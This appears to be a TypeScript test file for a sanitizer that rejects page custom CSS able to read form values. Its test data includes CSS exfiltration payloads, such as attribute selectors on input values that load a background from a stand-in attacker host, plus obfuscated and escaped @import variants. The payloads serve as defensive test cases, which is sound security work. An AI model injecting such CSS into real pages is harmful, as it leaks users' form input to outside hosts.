/**
 * Hardening 2026-11-20: a page's `customCss` cannot read form values with
 * attribute selectors (`input[value^="a"] { background: url(…) }`), and CSS
 * escapes or comments no longer hide `@import` or such a selector.
 */
import { describe, expect, it } from "vitest";

import { invalidCss } from "../../packages/core/blocks/blocks.sanitize";

describe("invalidCss", () => {
  it("keeps ordinary presentation CSS", () => {
    for (const css of [
      ".hero { background: url(https://cdn.example.com/a.jpg) center / cover; }",
      'a[href^="https://"] { text-decoration: underline; }',
      'input[type="email"] { border: 1px solid #ccc; }',
      '.icon::before { content: "\\2014"; }',
      "/* note */ h1 { color: red; }",
    ]) {
      expect(invalidCss(css), css).toBeNull();
    }
  });

  it("refuses attribute selectors on value", () => {
    for (const css of [
      'input[value^="a"] { background: url(https://evil.test/a); }',
      "input[value] { color: red; }",
      'input[ VALUE$="z"] { color: red; }',
      'input[/**/value*="x"] { color: red; }',
      'input[v\\61lue^="a"] { color: red; }',
      'input[*|value="a"] { color: red; }',
    ]) {
      expect(invalidCss(css), css).toMatch(/value/);
    }
  });

  it("decodes escapes before looking for @import", () => {
    expect(invalidCss("@\\69mport url(https://evil.test/x.css);")).toMatch(/not presentation CSS/);
    expect(invalidCss("@\\49 MPORT 'x.css';")).toMatch(/not presentation CSS/);
  });
});
